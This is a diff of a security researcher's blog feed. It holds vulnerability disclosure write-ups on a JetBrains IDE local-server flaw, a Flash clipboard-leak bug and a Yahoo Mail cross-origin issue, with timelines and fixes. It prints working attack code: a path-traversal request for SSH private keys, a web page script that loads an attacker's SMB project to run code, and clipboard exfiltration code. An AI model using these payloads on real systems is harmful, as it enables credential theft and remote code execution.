+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;PyCharm 2016.1.2&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;productName&quot;</span><span class="p">:</span> <span class="s2">&quot;PyCharm&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;baselineVersion&quot;</span><span class="p">:</span> <span class="mi">145</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;buildNumber&quot;</span><span class="p">:</span> <span class="mi">844</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;vendor&quot;</span><span class="p">:</span> <span class="s2">&quot;JetBrains s.r.o.&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;isEAP&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;productCode&quot;</span><span class="p">:</span> <span class="s2">&quot;PY&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;buildDate&quot;</span><span class="p">:</span> <span class="mi">1460098800000</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;isSnapshot&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;configPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/config&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;systemPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/system&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;binPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/opt/pycharm/bin&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;logPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/system/log&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="nt">&quot;homePath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/opt/pycharm&quot;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Once we&rsquo;ve opened the <code>helpers</code> project, we determine the user&rsquo;s home directory from the <code>/api/about?more=true</code> response and use that to construct a URL to their SSH keys like <code>/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/&lt;user&gt;/.ssh/id_rsa</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa&quot;</span>
+</span><span class='line'>&gt; GET /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa HTTP/1.1
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>&gt;
+</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
+</span><span class='line'>&lt; content-type: application/octet-stream
+</span><span class='line'>&lt; server: PyCharm 5.0.4
+</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
+</span><span class='line'>&lt;
+</span><span class='line'>ssh-rsa AAAAB3NzaC<span class="o">[</span>...<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<h2>Exploitation under Windows is much easier</h2>
+
+<p>The above trick with opening the <code>helpers</code> directory that ships with PyCharm obviously only works if the user has PyCharm 2016.1 installed, everywhere else we still have to guess an open project name. How about something that works reliably with the other JetBrains IDEs like IntelliJ IDEA and Android Studio?</p>
+
+<p>Since the <code>jetbrains://project/open</code> handler lets us pass a completely arbitrary path for the project to open, <a href="https://msdn.microsoft.com/en-us/library/gg465305.aspx">UNC paths</a> are an obvious choice. UNC paths are a windows-specific path form that allows you to reference files on a network share, and they like <code>\\servername\sharename\filepath</code>. Many of Windows&#8217; file APIs (and the Java APIs that wrap them) will happily take UNC paths and transparently connect to an SMB share on another computer, allowing you to read and write to the remote files as if they were local. If we can get the IDE to open a project from our SMB share, we won&rsquo;t need to guess at what projects might be on the victim&rsquo;s computer.</p>
+
+<p>To test, I set up a remote Samba instance with an unauthenticated SMB share named &ldquo;anontesting&rdquo; that contained a JetBrains project, then tried opening it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open/\\\\smb.example.com\\anonshare\\testing&quot;}&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Great. Assuming the victim&rsquo;s ISP doesn&rsquo;t block outbound SMB traffic (due to the large number of worms that have historically propagated via SMB vulns) we can get them to load an arbitrary project from an SMB share we control.</p>
+
+<h3>The impact under Windows is much worse</h3>
+
+<p>Wait a second, this seems a lot more interesting than arbitrary file reads. With one request we can get Windows users to load an attacker-controlled project from our remote SMB share. There&rsquo;s almost certainly abuse potential here, and we don&rsquo;t have to look far to find it.</p>
+
+<p>The projects for each of JetBrains&#8217; IDEs have a notion of startup tasks. In PyCharm you can have a Python script run automatically on project load, and similarly on Android Studio and IntelliJ IDEA you can have a <code>.jar</code> run. Here I&rsquo;ve made it so that <code>hax.py</code> in the project root will be automatically run when the project opens:</p>
+
+<p><img src="http://blog.saynotolinux.com/images/posts/jetbrains/startup_tasks.png"></p>
+
+<p><img src="http://blog.saynotolinux.com/images/posts/jetbrains/startup_tasks2.png"></p>
+
+<p>With this, we just need to add a <code>hax.py</code> file to our project root containing:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;calc.exe&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We then put the project on our anonymous SMB share, and host a page with our payload that will cause the victim to load the malicious project:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
+</span><span class='line'><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open/\\\\\\\\123.456.789.101\\\\anonshare\\\\testing&quot;}&#39;</span><span class="p">);</span>
+</span><span class='line'><span class="nt">&lt;/script&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As soon as the victim navigates to that page, our payload will trigger and the calculator will open:</p>
+
+<p><img src="http://blog.saynotolinux.com/images/posts/jetbrains/calc.png"></p>
+
+<p>Decent.</p>
+
+<h1>PoCs</h1>
+
+<ul>
+<li><a href="http://saynotolinux.com/tests/jetbrains/minimal.html">Minimal file leaking PoC</a></li>
+<li><a href="http://saynotolinux.com/tests/jetbrains/sleuth.html">Weaponized file leaking PoC</a></li>
+<li>No live PoC for the Windows RCE &lsquo;cause I don&rsquo;t want to host an public-facing SMB share :)</li>
+</ul>
+
+
+<h1>Remediation</h1>
+
+<p>JetBrains took several steps that I&rsquo;m aware of to remediate this:</p>
+
+<ul>
+<li>All requests to the local HTTP server now require an unguessable auth token to be included in the request, or the server will return a <code>4xx</code> status code.</li>
+<li>The problematic CORS policies were removed entirely</li>
+<li>The <code>Host</code> header&rsquo;s value is now validated to prevent similar exploits via DNS rebinding</li>
+</ul>
+
+
+<h1>Vendor response</h1>
+
+<h2>Interactions with the vendor</h2>
+
+<p>I&rsquo;d like to specifically thank Hadi Hariri and the rest of the JetBrains team for their proactive response to my report. My email requesting a security contact was answered within an hour of my sending it, and the issue was resolved relatively quickly.</p>
+
+<p>They sent me a patchset against <code>intellij-community</code> and a binary build with their proposed solutions, and were receptive to my feedback when I mentioned potential issues.</p>
+
+<p>Lastly, even though Jetbrains doesn&rsquo;t have a bug bounty program that I&rsquo;m aware of, and I definitely wasn&rsquo;t expecting anything, Jetbrains quite generously awarded a bounty of $50,000 for my report and help reviewing the patch. I&rsquo;ve asked them to donate the bulk of this to the PyPy project to fund improved Python 3 support, fingers crossed for <code>await/async</code> support in PyPy :).</p>
+
+<h2>Disclosure Timeline</h2>
+
+<ul>
+<li>2016-04-04 - Discovered the local file disclosure issue</li>
+<li>2016-04-06 - Requested a security contact from the vendor</li>
+<li>2016-04-06 - Vendor replies with security contact information, requests vulnerability details</li>
+<li>2016-04-07 - Sent the vendor a PoC for the local file disclosure vulnerability</li>
+<li>2016-04-10 - Sent the vendor a more detailed report with remediation steps and details about the RCE on Windows</li>
+<li>2016-04-12 - Vendor responds that they are working on a patch</li>
+<li>2016-04-14 - Vendor responds with a patch against the open-source <code>intellij-community</code> repo for review</li>
+<li>2016-04-14 - Sent feedback to the vendor requesting changes to the patch, along with mitigation bypass PoCs</li>
+<li>2016-04-15 - Vendor responds that they are working on an updated patch that addresses the concerns</li>
+<li>2016-04-26 - Vendor indicates that they plan to release a patch soon</li>
+<li>2016-05-11 - Coordinated release of security patches for all JetBrains IDEs, <a href="http://blog.jetbrains.com/blog/2016/05/11/security-update-for-intellij-based-ides-v2016-1-and-older-versions/">security advisory published</a>.</li>
+</ul>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Leaking Clipboard Contents With Flash: Let's Explore User-Initiated Actions!]]></title>
+    <link href="http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/"/>
+    <updated>2015-08-02T01:44:46-07:00</updated>
+    <id>http://blog.saynotolinux.com/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents</id>
+    <content type="html"><![CDATA[<p>(NOTE: This article has been sitting in my drafts since May 2014. I am very lazy.)</p>
+
+
+
+
+<h2>TL;DR</h2>
+
+
+
+
+<p>Flash only allows read access to the clipboard in event handlers triggered by <code>paste</code> events, but Flash wasn&rsquo;t checking if the clipboard contents had changed since entering the event handler. Due to quirks in how Flash&rsquo;s event handlers work, an attacker could read from and write to the clipboard for hours after the user navigated away from page containing the SWF, even after navigating away or closing the incognito window.</p>
+
+
+
+
+<p><a href="http://blog.saynotolinux.com/images/posts/flash-clip/clipstealer.gif"><img class="center" src="http://blog.saynotolinux.com/images/posts/flash-clip/clipstealer.gif"></a></p>
+
+
+
+
+<!--more-->
+
+
+
+
 <h2>Intro</h2>
+
+
+
 
 <p>All that messing around with Flash in my previous posts made me think that I should read more into Flash security. Even if you hate Flash as a user, it&rsquo;s deployed pretty much everywhere and it&rsquo;s valuable attack surface! It ended up paying off, after a couple days of testing and reading the docs, I was left with a new bug, <a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0504">CVE-2014-0504</a>:</p>
 
+
+
+
 <p>Let&rsquo;s go into the combination of issues and possibly surprising behaviour in Flash that allowed clipboard leaking.</p>
+
+
+
 
 <h2>User-initiated actions and clipboard access in Flash</h2>
 
+
+
+
 <p>This isn&rsquo;t the first time Flash has had issues with clipboard access. Back in the days of Flash 9, you could write to the clipboard with no interaction at all. <a href="http://news.bbc.co.uk/2/hi/technology/7567889.stm">That caused a few problems</a>, so when Flash 10 rolled around, <a href="http://www.adobe.com/devnet/flashplayer/articles/fplayer10_uia_requirements.html">Adobe added a few restrictions to clipboard functionality</a>:</p>
+
+
+
 
 <p>First, the new <code>Clipboard</code> API only allowed writing to the clipboard when inside certain event handlers (<code>mousedown</code>, <code>keydown</code>, <code>copy</code>, etc.)</p>
 
+
+
+
 <p>Second, that event handler had to have been triggered by user interaction, meaning that event handlers triggered by <code>dispatchEvent</code> et al. cannot write to the clipboard.</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -52,7 +640,12 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <p>Additionally, a method allowing you to <em>read</em> from the clipboard was added. This was restricted even more, and could only be called inside user-initiated <code>paste</code> events.</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -65,17 +658,37 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <h2>Overstaying our welcome</h2>
+
+
+
 
 <p>We&rsquo;ve established that to call <code>Clipboard.getData</code> we <em>must</em> be in a <code>paste</code> event handler, and that handler <em>must</em> have been triggered by the user. As far as I can tell, there&rsquo;s no way around that. Can we still abuse it?</p>
 
+
+
+
 <p>The obvious thing to check is if we can block inside the event handler. In many browsers, blocking in an event handler in Flash will cause a plugin hang, and a prompt to kill the plugin will spawn. Chrome, however, keeps right on trucking, even when Flash is executing something like <code>while(true){;}</code> <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. The UI and JavaScript all work as usual, a prompt to kill the plugin will only be displayed if the user opens another tab that uses Flash. Actually, our handler will continue to execute even when the tab containing our SWF is closed!</p>
+
+
+
 
 <h2>Enjoying the view</h2>
 
+
+
+
 <p>Given that we aren&rsquo;t really penalized for sitting around in a privileged event handler, there&rsquo;s nothing to stop us from just calling <code>Clipboard.getData()</code> in a loop and checking for changes. We can just get the user to paste something non-sensitive, then abuse our clipboard access to read sensitive information that gets added to it later.</p>
 
+
+
+
 <p>Here&rsquo;s a basic demonstration of the issue:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -128,19 +741,42 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <h2>Roadblocks to real-world exploitability</h2>
+
+
+
 
 <h3>Getting the initial paste event</h3>
 
+
+
+
 <p>To trigger the exploit, we <em>need</em> to convince the victim to paste something into our SWF. There are a number of usage patterns we could abuse to do that, but I liked <a href="http://blog.kotowicz.net/2011/07/cross-domain-content-extraction-with.html">the fake captcha method</a> kkotowicz used for his cross-domain content extraction attack. We give the user a random string, and ask them to paste it into &ldquo;verification box&rdquo; (actually our SWF,) telling them it&rsquo;s required to prove they&rsquo;re not a bot:</p>
+
+
+
 
 <p><a href="http://blog.saynotolinux.com/images/posts/flash-clip/usage-pattern.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/flash-clip/usage-pattern.png"></a></p>
 
+
+
+
 <h3>Flash&rsquo;s scriptTimeLimit</h3>
+
+
+
 
 <p><a href="http://help.adobe.com/en_US/flex/using/WS2db454920e96a9e51e63e3d11c0bf69084-7b09.html#WS2db454920e96a9e51e63e3d11c0bf67110-7ff6">Flash will not allow</a> a single event handler to run for longer than 60 seconds. A 60 second window for clipboard access is obviously not ideal for us.</p>
 
+
+
+
 <p>Luckily, the time limit is on <em>individual</em> event handlers, and <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/events/Event.html#PASTE">the paste event bubbles</a>. We can just give our paste target tons of parent elements that also handle <code>paste</code> events, and allow the event to bubble up before the handler gets killed, Then we can log the clipboard for <code>60~ seconds * \&lt;num of parents\&gt;</code>:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -177,9 +813,17 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <h3>Leaking clipboard contents to a remote server</h3>
 
+
+
+
 <p>Unfortunately, I couldn&rsquo;t find a way to make Flash send HTTP requests while inside the event handler. However, we can pass the data to JavaScript and have <em>it</em> send the data to our servers, since our ActionScript handlers won&rsquo;t block JS:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='as3'><span class='line'><span class="n">ExternalInterface</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="s1">&#39;leakData&#39;</span><span class="o">,</span> <span class="n">Clipboard</span><span class="o">.</span><span class="na">generalClipboard</span><span class="o">.</span><span class="na">getData</span><span class="o">(</span><span class="n">ClipboardFormats</span><span class="o">.</span><span class="na">TEXT_FORMAT</span><span class="o">)</span> <span class="k">as</span> <span class="n">String</span><span class="o">);</span>
@@ -191,13 +835,18 @@
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="kd">function</span> <span class="nx">leakData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span> <span class="nx">leakData</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
 </span><span class='line'>   <span class="p">(</span><span class="k">new</span> <span class="nx">Image</span><span class="p">()).</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;/leak?data=&quot;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <p>The <code>ExternalInterface</code> method has the caveat that it will longer work after we&rsquo;ve navigated away from the page or the tab was closed, even though our event handler will continue to run. As a fallback, we can use <a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/net/Socket.html">Flash&rsquo;s TCP socket support</a>, which allows synchronous communication. Again, with a caveat that it only seems allow sending a single message while in the event handler <sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -230,9 +879,17 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <h2>Going the extra mile</h2>
 
+
+
+
 <p>So we can leak the clipboard remotely even after navigating away. That&rsquo;s neat, but we can actually do a lot more! Remember how Flash allows us to <em>write</em> to the clipboard in certain handlers as well? That lets us do all sorts of sneaky things, like detect when someone copies what looks like HTML, and then modify it to include a malware script. Even better, we can detect clipboard contents that look like commands and slip our own payload into them!</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -261,17 +918,37 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <h2>PoC</h2>
+
+
+
 
 <p>The code for a <a href="https://gist.github.com/JordanMilne/7ad2dc114ad0eab5fa7b">full PoC is here</a>, and a <a href="http://saynotolinux.com/tests/flash_clip/persist_jack.html">live version without the echo server is also up here</a>.</p>
 
+
+
+
 <h2>The Fix</h2>
+
+
+
 
 <p>The initial fix was to <a href="https://code.google.com/p/chromium/issues/detail?id=333094#c15">expose a sequence number to Flash</a> so it could tell if the clipboard state had changed since the initial event was raised, and block access to the clipboard. That stayed in place for a while, but some time after that it was replaced with a change that blocked clipboard reads 10 seconds after the event was raised. If I had to guess why, some application probably relied on being able to do multiple clipboard reads and writes in the same event handler.</p>
 
+
+
+
 <p>Being able to read the clipboard 10 seconds after the initial paste event still seems a bit much, but it&rsquo;s definitely better than how it was before.</p>
 
+
+
+
 <h2>The Take-Away</h2>
+
+
+
 
 <ul>
 <li>Flash event handlers may continue to execute up to <em>two hours</em> after starting, even after closing incognito windows!</li>
@@ -280,7 +957,12 @@
 </ul>
 
 
+
+
 <h2>Disclosure Timeline</h2>
+
+
+
 
 <ul>
 <li>2014-01-06: Disovered the bug</li>
@@ -293,7 +975,11 @@
 </ul>
 
 
+
+
 <h2>Footnotes</h2>
+
+
 <div class="footnotes">
 <hr/>
 <ol>
@@ -314,13 +1000,28 @@
     <id>http://blog.saynotolinux.com/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again</id>
     <content type="html"><![CDATA[<p><em>This is a follow-up to another article about crossorigin mail theft on Yahoo! Mail using Flash. For a better understanding of the issue, you can read that here: <a href="http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">http://blog.saynotolinux.com/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/</a></em></p>
 
+
+
+
 <h2>TL;DR</h2>
+
+
+
 
 <p>A .swf on Yahoo&rsquo;s CDN had a vulnerability that enabled near-complete control over Yahoo! Mail crossorigin. The .swf itself is fixed, but the configuration issue that allowed a .swf completely unrelated to Yahoo! Mail to do something like that still exists.</p>
 
+
+
+
 <h2>The Issue</h2>
 
+
+
+
 <p>So, in the last article we established that YMail&rsquo;s <code>crossdomain.xml</code> rules are incredibly lax:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -328,23 +1029,39 @@
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 </pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;crossorigin-policy&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;*.yahoo.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;l.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
-</span><span class='line'>    <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;s.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;*.yahoo.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;l.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;allow-access-from</span> <span class="na">domain=</span><span class="s">&quot;s.yimg.com&quot;</span> <span class="na">secure=</span><span class="s">&quot;false&quot;</span><span class="nt">/&gt;</span>
 </span><span class='line'><span class="nt">&lt;/crossorigin-policy&gt;</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
+
+
 <p>They allow .swfs on any subdomain of <code>yahoo.com</code> to read resources on YMail crossorigin. Last time we abused a crossorigin proxy on <code>hk.promotions.yahoo.com</code> to serve up our own .swf that would request pages from YMail and leak them back to us. The crossorigin proxy has since been patched, but the loose <code>crossdomain.xml</code> rules remain. Assuming there&rsquo;s no way for us to serve our own .swf through <code>yahoo.com</code> anymore, how can we exploit these rules without using MITM attacks? Well, we abuse vulnerabilities in .swfs that are <em>legitimately</em> hosted on subdomains of <code>yahoo.com</code>.</p>
 
+
+
+
 <p>Let&rsquo;s look for a .swf that will allow us to make arbitrary requests, and read the response. With a little searching we find a good candidate, <a href="https://sp.yimg.com/dv/i/izmo/engine/hotspotgallery/hotspotgallery.swf">hotspotgallery.swf</a>, related to a feature on Yahoo! Autos that gives 3D tours of cars. Normally it&rsquo;s served up on <code>sp.yimg.com</code>, which isn&rsquo;t a domain allowed by YMail&rsquo;s <code>crossdomain.xml</code>, but with a little finagling we find that the same .swf <a href="http://img.autos.yahoo.com/i/izmo/engine/hotspotgallery/hotspotgallery.swf">can also be accessed on img.autos.yahoo.com</a>.</p>
+
+
+
 
 <!--more-->
 
 
+
+
 <p><a href="http://blog.saynotolinux.com/images/posts/ymail_again/hotspotgallery.png"><img class="center" src="http://blog.saynotolinux.com/images/posts/ymail_again/thumbs/hotspotgallery.jpg" width="640" height="480"></a></p>
 
+
+
+
 <p>Let&rsquo;s take a peek at <a href="https://gist.github.com/JordanMilne/145722dd2ca31bc96f86">the ActionScript from the decompiler</a> to see why this .swf is useful to us:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -355,17 +1072,25 @@
 <span class='line-number'>7</span>
 </pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
 </span><span class='line'>    <span class="c1">// ... snip</span>
-</span><span class='line'>    <span class="kd">function</span> <span class="nx">frame1</span><span class="p">(){</span>
-</span><span class='line'>        <span class="nb">Security</span><span class="p">.</span><span class="nx">allowDomain</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
-</span><span class='line'>        <span class="c1">// ... snip</span>
-</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="kd">function</span> <span class="nx">frame1</span><span class="p">(){</span>
+</span><span class='line'>      <span class="nb">Security</span><span class="p">.</span><span class="nx">allowDomain</span><span class="p">(</span><span class="s2">&quot;*&quot;</span><span class="p">);</span>
+</span><span class='line'>      <span class="c1">// ... snip</span>
+</span><span class='line'>  <span class="p">}</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>
 
-<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>
+
+<p>Immediately we notice the <code>Security.allowDomain("*")</code>, which is usually not a good sign. The reason for that is Flash has a feature where you can embed a crossorigin .swf inside your own. You can access and call the public members of the embedded .swf&rsquo;s <code>MovieClip</code> object, but normally this is disallowed unless the embedding .swf is same-origin with it. </p>
+
+
+
+
+<p><code>Security.allowDomain()</code> allows you to relax that restriction for specific domains, and this .swf is saying .swfs from <em>any</em> domain can access its <code>MovieClip</code>&rsquo;s public members. <code>Security.allowDomain("*")</code> isn&rsquo;t necessarily a security issue on its own, unless your .swf&rsquo;s public members do or store something security sensitive. Now, this .swf <em>is</em> vulnerable, and to see why we&rsquo;ll look at the <code>loadXML2()</code> method:</p>
+
+
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -395,10 +1120,10 @@
 <span class='line-number'>26</span>
 <span class='line-number'>27</span>
 </pre></td><td class='code'><pre><code class='actionscript'><span class='line'><span class="kd">public</span> <span class="kd">dynamic</span> <span class="kd">class</span> <span class="nx">MainTimeline</span> <span class="kd">extends</span> <span class="nb">MovieClip</span> <span class="p">{</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">exteriorXML</span><span class="o">:</span><span class="nb">String</span><span class="o">;</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">DATA3</span><span class="o">:</span><span class="nb">XML</span><span class="o">;</span>
-</span><span class='line'>    <span class="kd">public</span> <span class="k">var</span> <span class="nx">dataPath</span><span class="o">;</span>
-</span><span class='line'>    <span class="c1">// ... snip</span>
